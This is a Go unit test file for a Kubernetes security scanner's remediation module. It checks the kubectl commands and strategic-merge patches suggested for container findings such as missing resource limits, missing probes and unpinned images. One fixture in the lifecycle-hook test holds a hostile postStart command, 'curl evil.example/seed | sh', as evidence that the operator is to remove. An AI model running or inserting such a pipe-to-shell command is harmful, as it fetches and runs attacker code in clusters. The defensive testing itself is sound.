package remediation

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/0hardik1/kubesplaining/internal/models"
)

// makeContainerSecFinding builds a minimal containersec-style Finding
// suitable for feeding into ForContainerSec. Mirrors the podsec test
// builder (makeFinding) but lives here so containersec_test.go does not
// depend on the load order of podsec_test.go's test helpers, and so the
// helper can stay tailored to the rule IDs in this module.
func makeContainerSecFinding(t *testing.T, ruleID, kind, namespace, name string, evidence map[string]any) models.Finding {
	t.Helper()
	body, err := json.Marshal(evidence)
	if err != nil {
		t.Fatalf("marshal evidence: %v", err)
	}
	return models.Finding{
		ID:       ruleID + ":" + kind + ":" + namespace + ":" + name,
		RuleID:   ruleID,
		Severity: models.SeverityMedium,
		Resource: &models.ResourceRef{
			Kind:      kind,
			Namespace: namespace,
			Name:      name,
		},
		Evidence: body,
	}
}

// TestForContainerSecLimitsStrategicPatch verifies LIMITS-001 emits a
// strategic-merge patch with the baseline resources block landing on the
// named container inside the workload's pod template.
func TestForContainerSecLimitsStrategicPatch(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-LIMITS-001", "Deployment", "default", "noresources", map[string]any{
		"container": "app",
	})
	hint := ForContainerSec("KUBE-CONTAINER-LIMITS-001", finding)
	body := expectStrategicPatch(t, hint, "Deployment", "default", "noresources")
	resources := containerResources(t, body, "Deployment", "app")
	requests, ok := resources["requests"].(map[string]any)
	if !ok {
		t.Fatalf("resources.requests = %v, want map", resources["requests"])
	}
	if requests["cpu"] != "250m" || requests["memory"] != "128Mi" {
		t.Errorf("requests = %+v, want cpu=250m memory=128Mi", requests)
	}
	limits, ok := resources["limits"].(map[string]any)
	if !ok {
		t.Fatalf("resources.limits = %v, want map", resources["limits"])
	}
	if limits["cpu"] != "500m" || limits["memory"] != "256Mi" {
		t.Errorf("limits = %+v, want cpu=500m memory=256Mi", limits)
	}
}

// TestForContainerSecProbeStrategicPatch verifies PROBE-001 emits a
// strategic-merge patch with a readinessProbe scaffold (exec sleep 1
// placeholder) landing on the named container.
func TestForContainerSecProbeStrategicPatch(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-PROBE-001", "DaemonSet", "kube-system", "agent", map[string]any{
		"container": "agent",
	})
	hint := ForContainerSec("KUBE-CONTAINER-PROBE-001", finding)
	body := expectStrategicPatch(t, hint, "DaemonSet", "kube-system", "agent")
	containers := podSpecField(t, body, "DaemonSet", "containers")
	list, ok := containers.([]any)
	if !ok || len(list) == 0 {
		t.Fatalf("containers = %v, want non-empty slice", containers)
	}
	entry, _ := list[0].(map[string]any)
	probe, ok := entry["readinessProbe"].(map[string]any)
	if !ok {
		t.Fatalf("container.readinessProbe = %v, want map", entry["readinessProbe"])
	}
	exec, ok := probe["exec"].(map[string]any)
	if !ok {
		t.Fatalf("readinessProbe.exec = %v, want map", probe["exec"])
	}
	cmd, ok := exec["command"].([]any)
	if !ok || len(cmd) == 0 {
		t.Fatalf("readinessProbe.exec.command = %v, want non-empty slice", exec["command"])
	}
	if cmd[0] != "sleep" {
		t.Errorf("readinessProbe.exec.command[0] = %v, want sleep", cmd[0])
	}
}

// TestForContainerSecImageCommandOnly verifies IMAGE-001 emits a
// command-only hint (no body) with a kubectl set image invocation that
// preserves the repo and leaves a literal <DIGEST> placeholder for the
// operator to fill in.
func TestForContainerSecImageCommandOnly(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-IMAGE-001", "Deployment", "default", "imgapp", map[string]any{
		"container": "app",
		"image":     "nginx:latest",
	})
	hint := ForContainerSec("KUBE-CONTAINER-IMAGE-001", finding)
	if hint == nil || hint.Patch == nil {
		t.Fatalf("expected non-nil hint, got %+v", hint)
	}
	if len(hint.Patch.Body) != 0 {
		t.Errorf("Patch.Body = %s, want empty", string(hint.Patch.Body))
	}
	if hint.Patch.Command == "" {
		t.Fatalf("Patch.Command is empty")
	}
	for _, want := range []string{"kubectl set image", "deployment/imgapp", "app=nginx@sha256:<DIGEST>", "-n default"} {
		if !strings.Contains(hint.Patch.Command, want) {
			t.Errorf("Patch.Command missing %q\ncommand: %s", want, hint.Patch.Command)
		}
	}
}

// TestForContainerSecImageRepoStripsTag confirms the suggestion uses the
// image repo (everything before the tag) rather than the full ref, so the
// rendered command does not produce nonsense like `nginx:latest@sha256:...`.
func TestForContainerSecImageRepoStripsTag(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-IMAGE-001", "Deployment", "ns", "app", map[string]any{
		"container": "c",
		"image":     "registry.example.com/foo/bar:1.2.3",
	})
	hint := ForContainerSec("KUBE-CONTAINER-IMAGE-001", finding)
	if hint == nil || hint.Patch == nil {
		t.Fatalf("expected non-nil hint")
	}
	if !strings.Contains(hint.Patch.Command, "registry.example.com/foo/bar@sha256:<DIGEST>") {
		t.Errorf("Patch.Command did not strip tag from repo: %s", hint.Patch.Command)
	}
	if strings.Contains(hint.Patch.Command, ":1.2.3@") {
		t.Errorf("Patch.Command left tag in repo: %s", hint.Patch.Command)
	}
}

// TestForContainerSecLifecycleEditCommand verifies LIFECYCLE-001 emits a
// command-only hint pointing at `kubectl edit` with prose that names the
// container and hook for the operator to remove.
func TestForContainerSecLifecycleEditCommand(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-LIFECYCLE-001", "Deployment", "default", "hooky", map[string]any{
		"container": "app",
		"hook":      "postStart",
		"command":   "curl evil.example/seed | sh",
	})
	hint := ForContainerSec("KUBE-CONTAINER-LIFECYCLE-001", finding)
	if hint == nil || hint.Patch == nil {
		t.Fatalf("expected non-nil hint, got %+v", hint)
	}
	if len(hint.Patch.Body) != 0 {
		t.Errorf("Patch.Body = %s, want empty", string(hint.Patch.Body))
	}
	for _, want := range []string{"kubectl edit", "deployment hooky", "-n default", "lifecycle", "app", "postStart"} {
		if !strings.Contains(hint.Patch.Command, want) {
			t.Errorf("Patch.Command missing %q\ncommand: %s", want, hint.Patch.Command)
		}
	}
}

// TestForContainerSecCronJobWrapping checks LIMITS-001 against a CronJob to
// confirm the patch envelope uses the deeper spec.jobTemplate.spec.template.spec
// path instead of the standard spec.template.spec wrapping.
func TestForContainerSecCronJobWrapping(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-LIMITS-001", "CronJob", "default", "nightly", map[string]any{
		"container": "app",
	})
	hint := ForContainerSec("KUBE-CONTAINER-LIMITS-001", finding)
	if hint == nil || hint.Patch == nil {
		t.Fatalf("expected non-nil hint")
	}
	var decoded map[string]any
	if err := json.Unmarshal(hint.Patch.Body, &decoded); err != nil {
		t.Fatalf("body parse: %v", err)
	}
	spec, _ := decoded["spec"].(map[string]any)
	if _, ok := spec["jobTemplate"]; !ok {
		t.Errorf("CronJob patch missing spec.jobTemplate envelope: %s", string(hint.Patch.Body))
	}
}

// TestForContainerSecPodWrapping confirms a Pod target lands the fragment at
// spec.<containers> directly, without the workload spec.template.spec.
func TestForContainerSecPodWrapping(t *testing.T) {
	t.Parallel()
	finding := makeContainerSecFinding(t, "KUBE-CONTAINER-LIMITS-001", "Pod", "default", "p", map[string]any{
		"container": "c",
	})
	hint := ForContainerSec("KUBE-CONTAINER-LIMITS-001", finding)
	if hint == nil || hint.Patch == nil {
		t.Fatalf("expected non-nil hint")
	}
	var decoded map[string]any
	if err := json.Unmarshal(hint.Patch.Body, &decoded); err != nil {
		t.Fatalf("body parse: %v", err)
	}
	spec, _ := decoded["spec"].(map[string]any)
	if _, ok := spec["template"]; ok {
		t.Errorf("Pod patch should not have spec.template envelope: %s", string(hint.Patch.Body))
	}
	if _, ok := spec["containers"]; !ok {
		t.Errorf("Pod patch missing spec.containers: %s", string(hint.Patch.Body))
	}
}

// TestForContainerSecNilResourceReturnsNil guards the defensive branch in
// patchTargetFromFinding: callers that hand us a Finding with no Resource
// should get nil back rather than a panic.
func TestForContainerSecNilResourceReturnsNil(t *testing.T) {
	t.Parallel()
	f := models.Finding{RuleID: "KUBE-CONTAINER-LIMITS-001"}
	if hint := ForContainerSec("KUBE-CONTAINER-LIMITS-001", f); hint != nil {
		t.Errorf("expected nil hint for finding without Resource, got %+v", hint)
	}
}

// TestForContainerSecUnknownRuleReturnsNil documents that the table is
// closed: rules outside the covered set return nil so callers fall back to
// the prose Remediation field.
func TestForContainerSecUnknownRuleReturnsNil(t *testing.T) {
	t.Parallel()
	f := makeContainerSecFinding(t, "KUBE-ESCAPE-001", "Deployment", "default", "x", map[string]any{
		"container": "app",
	})
	if hint := ForContainerSec("KUBE-ESCAPE-001", f); hint != nil {
		t.Errorf("expected nil hint for non-containersec rule, got %+v", hint)
	}
}

// TestForContainerSecMissingContainerReturnsNil verifies the container-scoped
// generators bail when Evidence.container is absent: producing a patch with
// an empty container name would silently target the wrong (or first)
// container, which is worse than emitting nothing.
func TestForContainerSecMissingContainerReturnsNil(t *testing.T) {
	t.Parallel()
	for _, rule := range []string{
		"KUBE-CONTAINER-LIMITS-001",
		"KUBE-CONTAINER-PROBE-001",
		"KUBE-CONTAINER-IMAGE-001",
	} {
		rule := rule
		t.Run(rule, func(t *testing.T) {
			t.Parallel()
			f := makeContainerSecFinding(t, rule, "Deployment", "default", "x", map[string]any{
				// no container key
			})
			if hint := ForContainerSec(rule, f); hint != nil {
				t.Errorf("expected nil hint when container missing from evidence, got %+v", hint)
			}
		})
	}
}

// containerResources is the containersec analogue of containerSecCtx in
// podsec_test.go: walk the wrapped strategic-merge body down to the named
// container's resources block. Keeps per-rule tests focused on the field
// they care about without re-traversing the envelope every time.
func containerResources(t *testing.T, decoded map[string]any, kind, container string) map[string]any {
	t.Helper()
	containers := podSpecField(t, decoded, kind, "containers")
	list, ok := containers.([]any)
	if !ok {
		t.Fatalf("containers is %T, want []any", containers)
	}
	for _, raw := range list {
		entry, ok := raw.(map[string]any)
		if !ok {
			continue
		}
		if entry["name"] != container {
			continue
		}
		res, ok := entry["resources"].(map[string]any)
		if !ok {
			t.Fatalf("container %q has no resources map: %+v", container, entry)
		}
		return res
	}
	t.Fatalf("container %q not found in patch body", container)
	return nil
}
